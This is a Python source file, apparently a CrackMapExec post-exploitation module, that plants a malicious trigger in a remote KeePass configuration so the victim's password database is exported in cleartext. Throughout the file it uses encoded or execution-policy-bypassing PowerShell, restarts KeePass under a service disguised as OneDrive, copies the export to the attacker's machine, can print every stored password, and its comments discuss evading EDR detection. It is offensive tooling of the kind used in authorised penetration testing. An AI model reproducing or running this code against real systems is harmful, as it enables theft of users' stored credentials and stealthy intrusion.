import os
import sys
import json
from random import randrange

from xmltodict import parse
from time import sleep
from csv import reader
from base64 import b64encode
from io import BytesIO, StringIO
from xml.etree import ElementTree
from cme.helpers.powershell import get_ps_script


class CMEModule:
    """
        Make use of KeePass' trigger system to export the database in cleartext
        References: https://keepass.info/help/v2/triggers.html
                    https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/

        Module by @d3lb3, inspired by @harmj0y work
    """

    name = 'keepass_trigger'
    description = "Set up a malicious KeePass trigger to export the database in cleartext."
    supported_protocols = ['smb']
    opsec_safe = False   # while the module only executes legit powershell commands on the target (search and edit files)
                        # some EDR like Trend Micro flag base64-encoded powershell as malicious
                        # the option PSH_EXEC_METHOD can be used to avoid such execution, and will drop scripts on the target
    multiple_hosts = False

    def __init__(self):
        # module options
        self.action = None
        self.keepass_config_path = None
        self.export_name = 'export.xml'
        self.export_path = 'C:\\Users\\Public'
        self.powershell_exec_method = 'PS1'
        self.print_passwords = 'FALSE'
        self.safe_edits = 'FALSE'

        # additionnal parameters
        self.share = 'C$'
        self.remote_temp_script_path = 'C:\\Windows\\Temp\\temp.ps1'
        self.keepass_binary_path = 'C:\\Program Files\\KeePass Password Safe 2\\KeePass.exe'
        self.local_export_path = '/tmp'
        self.trigger_name = 'export_database'
        self.poll_frequency_seconds = 5
        self.dummy_service_name = 'OneDrive Sync KeePass'

        with open(get_ps_script('keepass_trigger_module/RemoveKeePassTrigger.ps1'), 'r') as remove_trigger_script_file:
            self.remove_trigger_script_str = remove_trigger_script_file.read()

        with open(get_ps_script('keepass_trigger_module/AddKeePassTrigger.ps1'), 'r') as add_trigger_script_file:
            self.add_trigger_script_str = add_trigger_script_file.read()

        with open(get_ps_script('keepass_trigger_module/StartKeePass.ps1'), 'r') as start_keepass_script_file:
            self.start_keepass_script_str = start_keepass_script_file.read()

        with open(get_ps_script('keepass_trigger_module/RestartKeePass.ps1'), 'r') as restart_keepass_script_file:
            self.restart_keepass_script_str = restart_keepass_script_file.read()

    def options(self, context, module_options):
        """
        ACTION (mandatory)      Performs one of the following actions, specified by the user:
                                  ADD           insert a new malicious trigger into KEEPASS_CONFIG_PATH's specified file
                                  CHECK         check if a malicious trigger is currently set in KEEPASS_CONFIG_PATH's specified file
                                  RESTART       restart KeePass using a Windows service (used to force trigger reload), if multiple KeePass process are running, rely on USER option
                                  POLL          search for EXPORT_NAME file in EXPORT_PATH folder (until found, or manually exited by the user)
                                  CLEAN         remove malicious trigger from KEEPASS_CONFIG_PATH as well as database export files from EXPORT_PATH
                                  ALL           performs ADD, CHECK, RESTART, POLL, CLEAN actions one after the other

        KEEPASS_CONFIG_PATH     Path of the remote KeePass configuration file where to add a malicious trigger (used by ADD, CHECK and CLEAN actions)

        EXPORT_NAME             Name fo the database export file, default: export.xml
        EXPORT_PATH             Path where to export the KeePass database in cleartext, default: C:\\Users\\Public, %APPDATA% works well too for user permissions

        PRINT_PASSWORDS         Print every database entry when successfully recovered a cleartext database (TRUE/FALSE, default: FALSE)
        SAFE_EDITS              If KeePass is running, makes sure that configuration file edition (performed in ADD and CLEAN) do not interfere with the
                                currently loaded one by restarting the process on every edition (loses opsec safety) (TRUE/FALSE, default: FALSE).

        PSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use (while no 'malicious' command is executed..):
                                  ENCODE        run scripts through encoded oneliners
                                  PS1           run scripts through a file dropped in C:\\Windows\\Temp (default)

        Not all variables used by the module are available as options (ex: trigger name, temp folder path, etc.) but they can still be easily edited in the module __init__ code if needed
        """

        if 'ACTION' in module_options:
            if module_options['ACTION'] not in ['ADD', 'CHECK', 'RESTART', 'SINGLE_POLL', 'POLL', 'CLEAN', 'ALL']:
                context.log.error('Unrecognized action, use --options to list available parameters')
                exit(1)
            else:
                self.action = module_options['ACTION']
        else:
            context.log.error('Missing ACTION option, use --options to list available parameters')
            exit(1)

        if 'KEEPASS_CONFIG_PATH' in module_options:
            self.keepass_config_path = module_options['KEEPASS_CONFIG_PATH']

        if 'EXPORT_NAME' in module_options:
            self.export_name = module_options['EXPORT_NAME']

        if 'EXPORT_PATH' in module_options:
            self.export_path = module_options['EXPORT_PATH']

        if 'PRINT_PASSWORDS' in module_options:
            self.print_passwords = module_options['PRINT_PASSWORDS']

        if 'SAFE_EDITS' in module_options:
            self.safe_edits = module_options['SAFE_EDITS']

        if 'PSH_EXEC_METHOD' in module_options:
            if module_options['PSH_EXEC_METHOD'] not in ['ENCODE', 'PS1']:
                context.log.error('Unrecognized powershell execution method, use --options to list available parameters')
                exit(1)
            else:
                self.powershell_exec_method = module_options['PSH_EXEC_METHOD']

    def on_admin_login(self, context, connection):

        if self.action == 'ADD':
            # no need to SAFE_EDIT in ADD as we will restart KeePass right after
            self.add_trigger(context, connection)
        elif self.action == 'CHECK':
            self.check_trigger_added(context, connection)
        elif self.action == 'RESTART':
            self.restart(context, connection)
        elif self.action == 'POLL':
            self.poll(context, connection)
        elif self.action == 'CLEAN':
            self.clean(context, connection)
        elif self.action == 'ALL':
            self.all_in_one(context, connection)

    def add_trigger(self, context, connection):
        """Add a malicious trigger to a remote KeePass config file using the powershell script AddKeePassTrigger.ps1"""

        # check if the specified KeePass configuration file exists
        if self.trigger_added(context, connection):
            context.log.info('The specified configuration file already contains a trigger called "{}", skipping'.format(self.trigger_name))
            return

        context.log.info('Adding trigger "{}" to "{}"'.format(self.trigger_name, self.keepass_config_path))

        # checks if KeePass is currently running to perform safe addition if wanted by the user
        keepass_processes = self.is_running(context, connection)
        if keepass_processes and self.safe_edits == 'TRUE':
            if len(keepass_processes) == 1:
                context.log.info('KeePass is running, so we will stop, edit then start to make sure the config file is not overriden')
                self.stop(context, connection)
            elif len(keepass_processes) > 1:
                context.log.error('Multiple KeePass processes are running, try without SAFE_EDITS')
                return


        # prepare the trigger addition script based on user-specified parameters (e.g: trigger name, etc)
        # see data/keepass_trigger_module/AddKeePassTrigger.ps1 for the full script
        self.add_trigger_script_str = self.add_trigger_script_str.replace('REPLACE_ME_ExportPath', self.export_path)
        self.add_trigger_script_str = self.add_trigger_script_str.replace('REPLACE_ME_ExportName', self.export_name)
        self.add_trigger_script_str = self.add_trigger_script_str.replace('REPLACE_ME_TriggerName', self.trigger_name)
        self.add_trigger_script_str = self.add_trigger_script_str.replace('REPLACE_ME_KeePassXMLPath', self.keepass_config_path)

        # add the malicious trigger to the remote KeePass configuration file
        if self.powershell_exec_method == 'ENCODE':
            add_trigger_script_b64 = b64encode(self.add_trigger_script_str.encode('UTF-16LE')).decode('utf-8')
            add_trigger_script_cmd = 'powershell.exe -e {}'.format(add_trigger_script_b64)
            connection.execute(add_trigger_script_cmd)
            sleep(2) # as I noticed some delay may happen with the encoded powershell command execution
        elif self.powershell_exec_method == 'PS1':
            try:
                self.put_file_execute_delete(context, connection, self.add_trigger_script_str)
            except Exception as e:
                context.log.error('Error while restarting KeePass: {}'.format(e))
                return

        # restarts KeePass if we had it closed
        if keepass_processes and self.safe_edits == 'TRUE':
            self.start(context, connection, keepass_processes[0][1])

        # checks if the malicious trigger was effectively added to the specified KeePass configuration file
        if self.trigger_added(context, connection):
            context.log.success('Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files'.format(self.trigger_name, self.keepass_config_path))
        else:
            context.log.error('Unknown error when adding malicious trigger to file')
            sys.exit(1)

    def check_trigger_added(self, context, connection):
        """check if the trigger is added to the config file XML tree"""

        if self.trigger_added(context, connection):
            context.log.info('Malicious trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
        else:
            context.log.info('No trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))

    def is_running(self, context, connection):
        """Checks if KeePass in running by returning a list of KeePass processes informations"""
        search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
        search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
        csv_reader = reader(search_keepass_process_output_csv.split('\n'), delimiter=',')  # we return the powershell command as a CSV for easier column parsing
        next(csv_reader)  # to skip the header line
        keepass_process_list = list(csv_reader)
        return keepass_process_list

    def stop(self, context, connection):
        """Stop KeePass process"""
        stop_keepass_process_command_str = 'powershell.exe "taskkill /F /T /IM keepass.exe"'
        connection.execute(stop_keepass_process_command_str, True)

    def start(self, context, connection, keepass_user):
        """Start KeePass process using a Windows service defined using the powershell script StartKeePass.ps1"""
        # prepare the starting script based on user-specified parameters (e.g: keepass user, etc)
        # see data/keepass_trigger_module/StartKeePass.ps1
        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_KeePassUser', keepass_user)
        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_KeePassBinaryPath', self.keepass_binary_path)
        self.start_keepass_script_str = self.start_keepass_script_str.replace('REPLACE_ME_DummyServiceName', self.dummy_service_name)

        # actually start keePass on the remote target
        if self.powershell_exec_method == 'ENCODE':
            start_keepass_script_b64 = b64encode(self.start_keepass_script_str.encode('UTF-16LE')).decode('utf-8')
            start_keepass_script_cmd = 'powershell.exe -e {}'.format(start_keepass_script_b64)
            connection.execute(start_keepass_script_cmd)
        elif self.powershell_exec_method == 'PS1':
            try:
                self.put_file_execute_delete(context, connection, self.start_keepass_script_str)
            except Exception as e:
                context.log.error('Error while restarting KeePass: {}'.format(e))
                return
        return

    def restart(self, context, connection):
        """Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1
        If multiple process belonging to different users are running simultaneously, relies on the USER option to choose which one to restart"""

        # search for keepass processes
        search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
        search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
        csv_reader = reader(search_keepass_process_output_csv.split('\n'), delimiter=',') # we return the powershell command as a CSV for easier column parsing
        next(csv_reader)  # to skip the header line
        keepass_process_list = list(csv_reader)
        # check if multiple processes are running simulteanously
        if len(keepass_process_list) == 0:
            context.log.error('No running KeePass process found, aborting restart')
            return
        elif len(keepass_process_list) > 1:
            context.log.error('Multiple KeePass processes were found, aborting restart')
            return

        keepass_user = keepass_process_list[0][1]
        context.log.info("Restarting {}'s KeePass process".format(keepass_user))

        # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)
        # see data/keepass_trigger_module/RestartKeePass.ps1
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_KeePassUser', keepass_user)
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_KeePassBinaryPath', self.keepass_binary_path)
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace('REPLACE_ME_DummyServiceName', self.dummy_service_name)

        # actually performs the restart on the remote target
        if self.powershell_exec_method == 'ENCODE':
            restart_keepass_script_b64 = b64encode(self.restart_keepass_script_str.encode('UTF-16LE')).decode('utf-8')
            restart_keepass_script_cmd = 'powershell.exe -e {}'.format(restart_keepass_script_b64)
            connection.execute(restart_keepass_script_cmd)
        elif self.powershell_exec_method == 'PS1':
            try:
                self.put_file_execute_delete(context, connection, self.restart_keepass_script_str)
            except Exception as e:
                context.log.error('Error while restarting KeePass: {}'.format(e))
                return

    def poll(self, context, connection):
        """Search for the cleartext database export file in the specified export folder (until found, or manually exited by the user)"""
        found = False
        context.log.info('We need to wait for the user to open the database.')
        context.log.info('Press CTRL+C to abort and use CLEAN option if you want to revert changes made to KeePass config.')
        context.log.info('Polling for database export every {} seconds..'.format(self.poll_frequency_seconds))
        # if the specified path is %APPDATA%, we need to check in every user's folder
        if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
            poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
        else:
            export_full_path = "\'{}\\{}\'".format(self.export_path, self.export_name)
            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)

        # we poll every X seconds until the export path is found on the remote machine
        while not found:
            poll_exports_command_output = connection.execute(poll_export_command_str, True)
            if self.export_name not in poll_exports_command_output:
                print('.', end='', flush=True)
                sleep(self.poll_frequency_seconds)
                continue
            print('')

            # once a database is found, downloads it to the attackers machine
            context.log.success('Found database export !')
            for count, export_path in enumerate(poll_exports_command_output.split('\r\n')): # in case multiple exports found (may happen if several users exported the database to their APPDATA)
                try:
                    buffer = BytesIO()
                    connection.conn.getFile(self.share, export_path.split(":")[1], buffer.write)

                    # if multiple exports found, add a number at the end of local path to prevent override
                    if count > 0:
                        local_full_path = self.local_export_path + '/' + self.export_name.split('.')[0] + '_' + str(count) + '.' + self.export_name.split('.')[1]
                    else:
                        local_full_path = self.local_export_path + '/' + self.export_name

                    # downloads the exported database
                    with open(local_full_path, "wb") as f:
                        f.write(buffer.getbuffer())
                    remove_export_command_str = 'powershell.exe Remove-Item {}'.format(export_path)
                    connection.execute(remove_export_command_str, True)
                    context.log.success('Moved remote "{}" to local "{}"'.format(export_path, local_full_path))
                    found = True

                    if self.print_passwords == 'TRUE':
                        context.log.info('Extracting passwords..')
                        self.extract_password(context)

                except Exception as e:
                    context.log.error("Error while polling export files, exiting : {}".format(e))

    def clean(self, context, connection):
        """Checks for database export + malicious trigger on the remote host, removes everything"""

        # if the specified path is %APPDATA%, we need to check in every user's folder
        if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
            poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
        else:
            export_full_path = "\'{}\\{}\'".format(self.export_path, self.export_name)
            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)
        poll_export_command_output = connection.execute(poll_export_command_str, True)

        # deletes every export found on the remote machine
        if self.export_name in poll_export_command_output:
            for export_path in poll_export_command_output.split('\r\n'):  # in case multiple exports found (may happen if several users exported the database to their APPDATA)
                context.log.info('Database export found in "{}", removing'.format(export_path))
                remove_export_command_str = 'powershell.exe Remove-Item {}'.format(export_path)
                connection.execute(remove_export_command_str, True)
        else:
            context.log.info('No export found in {}'.format(self.export_path))

        # if the malicious trigger was not self-deleted, deletes it
        if self.trigger_added(context, connection):

            # checks if KeePass is currently running to perform safe addition if wanted by the user
            keepass_processes = self.is_running(context, connection)
            if keepass_processes and self.safe_edits == 'TRUE':
                if len(keepass_processes) == 1:
                    context.log.info('KeePass is running, so we will stop, edit then start to make sure the config file is not overriden')
                    self.stop(context, connection)
                elif len(keepass_processes) > 1:
                    context.log.error('Multiple KeePass processes are running, try without SAFE_EDITS')
                    return

            # prepare the trigger deletion script based on user-specified parameters (e.g: trigger name, etc)
            # see data/keepass_trigger_module/RemoveKeePassTrigger.ps1
            self.remove_trigger_script_str = self.remove_trigger_script_str.replace('REPLACE_ME_KeePassXMLPath', self.keepass_config_path)
            self.remove_trigger_script_str = self.remove_trigger_script_str.replace('REPLACE_ME_TriggerName', self.trigger_name)

            # actually performs trigger deletion
            if self.powershell_exec_method == 'ENCODE':
                remove_trigger_script_b64 = b64encode(self.remove_trigger_script_str.encode('UTF-16LE')).decode('utf-8')
                remove_trigger_script_command_str = 'powershell.exe -e {}'.format(remove_trigger_script_b64)
                connection.execute(remove_trigger_script_command_str, True)
            elif self.powershell_exec_method == 'PS1':
                try:
                    self.put_file_execute_delete(context, connection, self.remove_trigger_script_str)
                except Exception as e:
                    context.log.error('Error while deleting trigger, exiting: {}'.format(e))
                    sys.exit(1)

            if keepass_processes and self.safe_edits == 'TRUE':
                self.start(context, connection, keepass_processes[0][1])

            # check if the specified KeePass configuration file does not contain the malicious trigger anymore
            if self.trigger_added(context, connection):
                context.log.error('Unknown error while removing trigger "{}", exiting'.format(self.trigger_name))
            else:
                context.log.info('Found trigger "{}" in configuration file, removing'.format(self.trigger_name))
                if keepass_processes and self.safe_edits == 'FALSE':
                    context.log.info('As KeePass is running so the config file may be overridden and the trigger not deleted (it will most probably don\'t, but you can use SAFE_EDITS if you want to be 100% sure)')
        else:
            context.log.success('No trigger "{}" found in "{}", skipping'.format(self.trigger_name, self.keepass_config_path))

    def all_in_one(self, context, connection):

        """Performs ADD, RESTART, POLL and CLEAN actions one after the other"""
        context.log.highlight("")
        # we already restart the process, so no need to SAFE_EDITS in ADD
        curr_self_edits = self.safe_edits
        self.safe_edits = 'FALSE'
        self.add_trigger(context, connection)
        self.safe_edits = curr_self_edits  # restores self edit
        context.log.highlight("")
        self.restart(context, connection)
        self.poll(context, connection)
        context.log.highlight("")
        context.log.info('Cleaning everything..')
        self.clean(context, connection)

    def trigger_added(self, context, connection):
        """check if the trigger is added to the config file XML tree (returns True/False)"""
        # check if the specified KeePass configuration file exists
        if not self.keepass_config_path:
            context.log.error('No KeePass configuration file specified, exiting')
            sys.exit(1)

        try:
            buffer = BytesIO()
            connection.conn.getFile(self.share, self.keepass_config_path.split(":")[1], buffer.write)
        except Exception as e:
            context.log.error('Error while getting file "{}", exiting: {}'.format(self.keepass_config_path, e))
            sys.exit(1)

        try:
            keepass_config_xml_root = ElementTree.fromstring(buffer.getvalue())
        except Exception as e:
            context.log.error('Error while parsing file "{}", exiting: {}'.format(self.keepass_config_path, e))
            sys.exit(1)

        # check if the specified KeePass configuration file does not already contain the malicious trigger
        for trigger in keepass_config_xml_root.findall(".//Application/TriggerSystem/Triggers/Trigger"):
            if trigger.find("Name").text == self.trigger_name:
                return True

        return False

    def put_file_execute_delete(self, context, connection, psh_script_str):
        """Helper to upload script to a temporary folder, run then deletes it"""
        script_str_io = StringIO(psh_script_str)
        # if we run the method twice in a short period of time, the file may still be locked so we upload with different
        curr_remote_temp_script_path = self.remote_temp_script_path
        self.remote_temp_script_path = self.remote_temp_script_path.split('.')[0] + '_' + str(randrange(100)) + '.' + self.remote_temp_script_path.split('.')[1]
        connection.conn.putFile(self.share, self.remote_temp_script_path.split(":")[1], script_str_io.read)
        script_execute_cmd = 'powershell.exe -ep Bypass -F {}'.format(self.remote_temp_script_path)
        connection.execute(script_execute_cmd, True)
        remove_remote_temp_script_cmd = 'powershell.exe "Remove-Item \"{}\""'.format(self.remote_temp_script_path)
        connection.execute(remove_remote_temp_script_cmd)
        self.remote_temp_script_path = curr_remote_temp_script_path

    def extract_password(self, context):
        xml_doc_path = os.path.abspath(self.local_export_path + "/" + self.export_name)
        xml_tree = ElementTree.parse(xml_doc_path)
        root = xml_tree.getroot()
        to_string  = ElementTree.tostring(root, encoding='UTF-8', method='xml')
        xml_to_dict = parse(to_string)
        dump = json.dumps(xml_to_dict)
        obj = json.loads(dump)

        if len(obj['KeePassFile']['Root']['Group']['Entry']):
            for obj2 in obj['KeePassFile']['Root']['Group']['Entry']:
                for password in obj2['String']:
                    if password['Key'] == "Password":
                        context.log.highlight(str(password['Key']) + " : " + str(password['Value']['#text']))
                    else:
                        context.log.highlight(str(password['Key']) + " : " + str(password['Value']))
                context.log.highlight("")
        if len(obj['KeePassFile']['Root']['Group']['Group']):
            for obj2 in obj['KeePassFile']['Root']['Group']['Group']:
                try:
                    for obj3 in obj2['Entry']:
                        for password in obj3['String']:
                            if password['Key'] == "Password":
                                context.log.highlight(str(password['Key']) + " : " + str(password['Value']['#text']))
                            else:
                                context.log.highlight(str(password['Key']) + " : " + str(password['Value']))
                        context.log.highlight("")
                except KeyError:
                    pass


